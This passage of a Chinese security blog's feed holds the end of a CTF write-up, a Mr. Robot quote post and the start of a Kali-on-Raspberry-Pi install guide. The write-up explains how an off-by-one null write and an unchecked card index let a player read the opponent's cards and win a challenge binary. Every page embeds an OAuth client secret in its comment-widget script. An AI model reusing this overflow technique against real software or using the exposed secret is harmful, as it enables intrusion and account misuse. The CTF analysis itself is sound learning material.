class="line"><span class="keyword">while</span>((c = getchar()) != <span class="string">'\n'</span> &amp;&amp; c != EOF)&#123;</span><br><span class="line"><span class="keyword">if</span>(count &lt; (len<span class="number">-1</span>))&#123;</span><br><span class="line">buff[count] = c;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">buff[count+<span class="number">1</span>] = <span class="string">'\x00'</span>;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先用了个count做计数器，计算一行读入了多少个字符，注意这里终止在buff中记录name的条件是<br><code>count &lt; (len-1)</code><br>如果我们输入32个字符<br>那么当count为31时终止读入字符到buff中，继续往下看，结尾有个很奇怪的行为<br><code>buff[count+1] = &#39;\x00&#39;;</code><br>当在buff读入终止后此时的count为31，count+1为32，会将buff第32位设置为0x00，而buff的大小为32，下标从0到31，当读入的name超过了31到32的时候会发生什么？看结构体name数组下面那个变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[NAMEBUFFLEN];</span><br><span class="line"><span class="keyword">size_t</span> deckSize;</span><br></pre></td></tr></table></figure><p>在结构体中的数据是相邻存放的，即从name中溢出的第32位字符（\x00）会将deckSize置0，那么现在我们可以控制deckSize为0，继续跟进deckSize到最后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span> Implement card switching hands. Cheap hack here for playability</span></span><br><span class="line">gameData.deckSize--;</span><br><span class="line"><span class="keyword">if</span>(gameData.deckSize == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"All card used.\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在检查deckSize为0之前先自减了一次，即此时deckSize变成了-1，这意味着deckSize将永远不会为0，我们的牌就永远用不完，但是这又有什么用？我们的目标是赢得游戏，那么继续向前看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">deck</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> deckSize;</span><br><span class="line">    <span class="keyword">size_t</span> top;</span><br><span class="line">    card cards[<span class="number">52</span>];</span><br><span class="line">&#125; deck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">player</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> money;</span><br><span class="line">    deck playerCards;</span><br><span class="line">&#125; player;</span><br></pre></td></tr></table></figure><p>我们的牌存储在_deck结构体中的cards中，游戏中每次摸牌的时候就是从这个数组中取，可以看到这个数组的大小只有52，那么当我们把52张牌都用完了，并且还没有结束游戏的时候会发生什么？我们来把这三个结构体的顺序仔细分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">card</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> suit;</span><br><span class="line">    <span class="keyword">char</span> value;</span><br><span class="line">&#125; card;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">deck</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> deckSize;</span><br><span class="line">    <span class="keyword">size_t</span> top;</span><br><span class="line">    card cards[<span class="number">52</span>]; <span class="comment">// 恰巧这个结构体中最后一项数据就是我们的牌</span></span><br><span class="line">&#125; deck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">player</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> money;</span><br><span class="line">    deck playerCards; <span class="comment">// 而这个结构体的结尾存储上面的deck结构体</span></span><br><span class="line">&#125; player;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">gameState</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> playerMoney;</span><br><span class="line">  player ctfer; <span class="comment">// 这里存储上一个player结构体</span></span><br><span class="line">  <span class="keyword">char</span> name[NAMEBUFFLEN];</span><br><span class="line">  <span class="keyword">size_t</span> deckSize;</span><br><span class="line">  player opponent;</span><br><span class="line">&#125; gameState;</span><br></pre></td></tr></table></figure><p>此时我们看一下gameData中我们关心的数据在内存中是如何存放的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">···</span><br><span class="line">size_t  top</span><br><span class="line">card    cards * 52</span><br><span class="line">char    name * 32</span><br><span class="line">size_t  deckSize</span><br><span class="line">···</span><br><span class="line">···</span><br></pre></td></tr></table></figure><p>结构体是按照数据的定义顺序存放的，可以看到cards数组紧挨着name数组<br>而游戏中摸牌的时候是根据top来摸的，top如果大于了52（如果我们不能控制deckSize的话此时游戏已经结束了），摸牌的时候就会从name数组中按照card结构体的大小去取，所以当摸了超过52张牌后我们就可以控制card的value<br>试验一下我们取名字时取32个A，每一赌1个coin，当剩下48个coin时（即已经摸完了52张牌），会出现如下结果<br><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180613233017.png" alt><br>65恰巧就是’A’的ASCII码，这印证了前面的猜想，但是注意到它会说<br><code>That&#39;s not actually a valid card.</code><br>回到源码中看到这是由于没有通过检查函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Checks if a card is in invalid range</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkInvalidCard</span><span class="params">(card * inputCard)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(inputCard-&gt;suit &gt; <span class="number">4</span> || inputCard-&gt;value &gt; <span class="number">14</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在检查条件中的inputCard-&gt;value是我们可以随意控制的，但是65大于14，所以没有通过检查<br>现在我们有两个解决办法</p><ol><li>用脚本去发送32个’\x13’作为我们的名字</li><li>继续向下赌，每次赌1个coin。<br>还记得前面的top吗？虽然我们的名字是32个’A’（65），但是当top越过了name数组后碰到的会是后面的变量<br><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180613234028.png" alt><br>我们看看name和deckSize变量后面有哪些数据</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[NAMEBUFFLEN];</span><br><span class="line"><span class="keyword">size_t</span> deckSize;</span><br><span class="line">player opponent;</span><br></pre></td></tr></table></figure><p>正好是我们的对手的数据，这样让top一直增加，直到到了opponent的cards数组里，我们看一下在创建牌组的时候代码为opponent的牌组做了些什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Builds the deck for each player.</span></span><br><span class="line"><span class="comment">//Good luck trying to win ;)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildDecks</span><span class="params">(player * ctfer, player * opponent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">0</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">1</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">2</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">3</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ctfer-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    ctfer-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">    opponent-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    opponent-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的可以看到opponent的牌value明显大于我们，那么我们在出牌的时候value就会是opponent的value了<br>注意top时同时增长的，我们的top到了opponent的数据区里，而opponent的top到哪就不关我们的事了，这样就能赢了<br>最后拿到shell，flag为</p><blockquote><p>flag{W0W_Y0u_w1n_7he_g4mb11ng}</p></blockquote><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      2018届OUCCTF部分题目解析。
    
    </summary>
    
    
      <category term="ctf" scheme="https://srpopty.github.io/categories/ctf/"/>
    
    
      <category term="writeup" scheme="https://srpopty.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Who I am? What’s real? What’s the truth?</title>
    <link href="https://srpopty.github.io/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/"/>
    <id>https://srpopty.github.io/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/</id>
    <published>2018-06-03T13:54:57.000Z</published>
    <updated>2020-03-11T12:21:39.553Z</updated>
    
    <content type="html"><![CDATA[<p>Is it real? Is every real?<br>Actually, You are nothing but yourself.<br><img src="/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/005znnVBly1fri8bbcemlj30fn35s7wj.jpg" alt></p><hr><p>I just kept on running, running, running.<br>Trying to find out who I was.<br>I would go the distance but it wasn’t far enough.<br>But now I’m standing straight and know exactly who I am.<br><img src="/2018/06/03/Who-I-am-What%E2%80%99s-real-What%E2%80%99s-the-truth/005znnVBly1fri8beaov9j30k02sq4qq.jpg" alt></p><hr><p>Every day, We change the world, but to changes the world in a way that means anything, that takes more time than most people have.<br>It never happens all at once.</p><p>It’s slow.<br>It’s methodical.<br>It’s exhausting.</p><p>We don’t all have the stomach for it.</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      Mr. Robot
    
    </summary>
    
    
      <category term="life" scheme="https://srpopty.github.io/categories/life/"/>
    
    
      <category term="think" scheme="https://srpopty.github.io/tags/think/"/>
    
  </entry>
  
  <entry>
    <title>树莓派安装Kali记录</title>
    <link href="https://srpopty.github.io/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/"/>
    <id>https://srpopty.github.io/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/</id>
    <published>2018-06-02T15:25:38.000Z</published>
    <updated>2020-03-11T12:21:31.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="树莓派"><a href="#树莓派" class="headerlink" title="树莓派"></a>树莓派</h1><p>昨天晚上鄙人在树莓派的kali里在安装某IDE的时候死机了，只能断电重启，再开机的时候更新时出现了”Structure Needs Cleaning”错误，找了很多办法没有解决，嫌麻烦，不如重新安装一下树莓派kali系统，顺便记录下安装过程。</p><p>鄙人使用的是树莓派3B+，用了半年，总得来说感觉还不错，运行kali桌面版还是很流畅的，就是内存有点小，msf这类的重武器有时候会因为内存不够而崩溃，配上了一个外壳，小触控屏，小键盘，可以随身携带，充电宝就能供电，某品牌1w毫安充电宝一格电能用一下午，用来无线渗透效果最好，当然nmap扫一扫也行，用来爆破的话效率很低，不过休闲的时候当个pad看看电影什么的也挺不错。<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E5%9B%BE%E7%89%8720180601152842.jpg" alt></p><p>树莓派各版本配置如下(图片来源<a href="http://shumeipai.nxez.com/" target="_blank" rel="noopener">树莓派实验室</a>)<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/raspberrypi-version-compare.png" alt></p><hr><h1 id="一张SD卡"><a href="#一张SD卡" class="headerlink" title="一张SD卡"></a>一张SD卡</h1><ol><li><p>首先需要准备一张SD卡，不用太大，经济版16G，高配版32G，按需选择即可，如果想在树莓派中存一些大字典可以考虑64G或128G。</p></li><li><p>使用<a href="https://www.sdcard.org/downloads/formatter_4/index.html" target="_blank" rel="noopener">SDCardFormatter</a>格式化SD卡，格式化的时候选择快速格式化即可。<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601134357.png" alt></p></li></ol><hr><h1 id="树莓派的kali系统"><a href="#树莓派的kali系统" class="headerlink" title="树莓派的kali系统"></a>树莓派的kali系统</h1><ol><li>下载<a href="https://www.offensive-security.com/kali-linux-arm-images/" target="_blank" rel="noopener">kali的树莓派版本</a>，选择<strong>Kali Linux RaspberryPi 2 and 3</strong><br>，Kali Linux Rpi0w Nexmon 是为树莓派zero提供的，以及 Kali Linux RaspberryPi w/TFT 是为触屏提供的，这两个版本在本文中不涉及。</li></ol><ol start="2"><li>下载完成后会得到”.img.xz”后缀的文件，解压即可，有人说不解压也可以直接烧录进SD卡，但是鄙人并没有成功，为了保险起见还是解压之后在烧录。</li></ol><ol start="3"><li>把SD卡插入电脑（使用读卡器），再使用Win32DiskImager将kali镜像烧录到SD卡中，会弹出一个确认框，警告会擦除SD卡中所有数据，直接点击确定。<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601161329.png" alt></li></ol><ol start="4"><li>烧录过程可能会有点慢，左下角可以看到烧录速度，大概需要十分钟到十五分钟，烧录速度具体取决于不同电脑，尽量不要在烧录的时候操作电脑，否则会拖慢烧录速度。<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601161547.png" alt></li></ol><ol start="5"><li>烧录完成后Windows会弹出一个框，要格式化这张卡，不用管直接关掉，拔出SD卡，理论上此时你的SD卡应该会很烫，建议稍微降降温等一会再插入树莓派中。</li></ol><hr><h1 id="在树莓派上安装Kali"><a href="#在树莓派上安装Kali" class="headerlink" title="在树莓派上安装Kali"></a>在树莓派上安装Kali</h1><ol><li>刚才已经烧录完了kali系统，现在把SD卡插到树莓派中，启动电源，会自动安装系统，此时会看到树莓派上的绿灯在疯狂闪，这就代表树莓派正在对SD卡读写，<strong>注意在树莓派的绿灯有闪动的时候千万不要断电！:)</strong></li></ol><ol start="2"><li>安装时最好能有个屏幕，否则安装结束后登录kali会很麻烦，鄙人不才，暂时没有无屏幕安装kali的办法，Kali不同于raspbian，虽然它们默认都没有启用ssh，但是raspbian可以手动在SD卡中放入一个名为SSH的文件来启用ssh，安装系统成功之后直接ssh登录进去就可以，不需要屏幕，但是鄙人曾经在kali上用这种方法测试了一下午都没成功，所以安装kali时最好用一个屏幕，之后在系统内配置ssh，后文会讲。</li></ol><ol start="3"><li>当你看到下面这个界面的时候就代表正在进行安装，如果一直是黑屏的话检查一下绿灯有没有闪，没有的话检查下前面的步骤或者检查下SD卡有没有问题，再不行的话可能就是树莓派的问题了。<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E5%9B%BE%E7%89%8720180601165426.jpg" alt></li></ol><ol start="4"><li>安装成功后默认用户名密码登录即可，默认的用户名是root，密码是toor。</li></ol><hr><h1 id="开启SSH"><a href="#开启SSH" class="headerlink" title="开启SSH"></a>开启SSH</h1><ol><li>第一次登录成功后会让你选择xface的配置，选择默认配置即可，否则你会发现登录后的桌面空空如也，什么也没有，登录后的界面如下图，最好先连接Wifi，否则后面的有些配置会无法进行。<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E5%9B%BE%E7%89%8720180601165422.jpg" alt></li></ol><ol start="2"><li>首先要打开ssh，打开终端输入。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure openssh-server</span><br></pre></td></tr></table></figure></li></ol><p>之后一定要记得修改密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><p>这时可以用ssh连接尝试一下，主机和树莓派最好在同一个内网里，连接可以用有线或无线连接，任意选择一种即可。</p><ul><li>有线连接<br>  将网线与树莓派相连，共享无线网络，具体操作如下图所示，打开cmd，输入arp -a查看arp记录，找到树莓派的mac地址，即可找到树莓派的ip地址，ssh连接即可，断开连接后记得关闭共享无线网络。<br>  <img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601165031.png" alt></li><li>无线连接<br>  主机于树莓派同时连接到一个内网，或者主机打开热点树莓派连接。</li></ul><hr><h1 id="安装树莓派的配置软件raspi-config以及树莓派的其他配置"><a href="#安装树莓派的配置软件raspi-config以及树莓派的其他配置" class="headerlink" title="安装树莓派的配置软件raspi-config以及树莓派的其他配置"></a>安装树莓派的配置软件raspi-config以及树莓派的其他配置</h1><ol><li>连接到树莓派以后可以先稍稍美化一下终端，修改.bushrc文件，可以将终端的风格改为标准的Kali风格，鄙人的bushrc文件如下。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># System-wide .bashrc file for interactive bash(1) shells.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># To enable the settings / commands in this file for login shells as well,</span></span><br><span class="line"><span class="comment"># this file has to be sourced in /etc/profile.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If not running interactively, don't do anything</span></span><br><span class="line">[ -z <span class="string">"<span class="variable">$PS1</span>"</span> ] &amp;&amp; <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># check the window size after each command and, if necessary,</span></span><br><span class="line"><span class="comment"># update the values of LINES and COLUMNS.</span></span><br><span class="line"><span class="built_in">shopt</span> -s checkwinsize</span><br><span class="line"></span><br><span class="line"><span class="comment"># set variable identifying the chroot you work in (used in the prompt below)</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;debian_chroot:-&#125;</span>"</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="keyword">then</span></span><br><span class="line">    debian_chroot=$(cat /etc/debian_chroot)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a fancy prompt (non-color, overwrite the one in /etc/profile)</span></span><br><span class="line"><span class="comment"># PS1='$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ '</span></span><br><span class="line"><span class="comment"># PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '</span></span><br><span class="line"><span class="comment"># PS1='\[\e]0;\u@\h: \w\a\]$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$'</span></span><br><span class="line">PS1=<span class="string">'\[\033[38;5;196m\]\u@\h\[$(tput sgr0)\]\[\033[38;5;15m\]:\[$(tput sgr0)\]\[\033[38;5;33m\]\w\[$(tput sgr0)\]\[\033[38;5;15m\]\\$ \[$(tput sgr0)\]'</span></span><br><span class="line"><span class="comment"># PS1='\[\033[38;5;196m\]\u@\h\[$(tput sgr0)\]\[\033[38;5;15m\]:\[$(tput sgr0)\]\[\033[38;5;33m\]\w\[$(tput sgr0)\]\[\033[38;5;15m\]\\$ \[$(tput sgr0)\]'</span></span><br><span class="line"><span class="comment"># PS1='\[\033[38;5;196m\]\u@\h\[$(tput sgr0)\]\[\033[38;5;15m\]:[\[$(tput sgr0)\]\[\033[38;5;87m\]\w\[$(tput sgr0)\]\[\033[38;5;15m\]]\\$\[$(tput sgr0)\]'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Commented out, don't overwrite xterm -T "title" -n "icontitle" by default.</span></span><br><span class="line"><span class="comment"># If this is an xterm set the title to user@host:dir</span></span><br><span class="line"><span class="comment">#case "$TERM" in</span></span><br><span class="line"><span class="comment">#xterm*|rxvt*)</span></span><br><span class="line"><span class="comment">#    PROMPT_COMMAND='echo -ne "\033]0;$&#123;USER&#125;@$&#123;HOSTNAME&#125;: $&#123;PWD&#125;\007"'</span></span><br><span class="line"><span class="comment">#    ;;</span></span><br><span class="line"><span class="comment">#*)</span></span><br><span class="line"><span class="comment">#    ;;</span></span><br><span class="line"><span class="comment">#esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable bash completion in interactive shells</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">shopt</span> -oq posix; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -f /usr/share/bash-completion/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /usr/share/bash-completion/bash_completion</span><br><span class="line">  <span class="keyword">elif</span> [ -f /etc/bash_completion ]; <span class="keyword">then</span></span><br><span class="line">    . /etc/bash_completion</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if the command-not-found package is installed, use it</span></span><br><span class="line"><span class="keyword">if</span> [ -x /usr/lib/<span class="built_in">command</span>-not-found -o -x /usr/share/<span class="built_in">command</span>-not-found/<span class="built_in">command</span>-not-found ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">function</span> command_not_found_handle &#123;</span><br><span class="line">            <span class="comment"># check because c-n-f could've been removed in the meantime</span></span><br><span class="line">                <span class="keyword">if</span> [ -x /usr/lib/<span class="built_in">command</span>-not-found ]; <span class="keyword">then</span></span><br><span class="line">           /usr/lib/<span class="built_in">command</span>-not-found -- <span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line">                   <span class="built_in">return</span> $?</span><br><span class="line">                <span class="keyword">elif</span> [ -x /usr/share/<span class="built_in">command</span>-not-found/<span class="built_in">command</span>-not-found ]; <span class="keyword">then</span></span><br><span class="line">           /usr/share/<span class="built_in">command</span>-not-found/<span class="built_in">command</span>-not-found -- <span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line">                   <span class="built_in">return</span> $?</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">           <span class="built_in">printf</span> <span class="string">"%s: command not found\n"</span> <span class="string">"<span class="variable">$1</span>"</span> &gt;&amp;2</span><br><span class="line">           <span class="built_in">return</span> 127</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>效果如下<br><img src="/2018/06/02/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Kali%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20180601195845.png" alt></p><ol start="2"><li><p>安装raspi-config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade 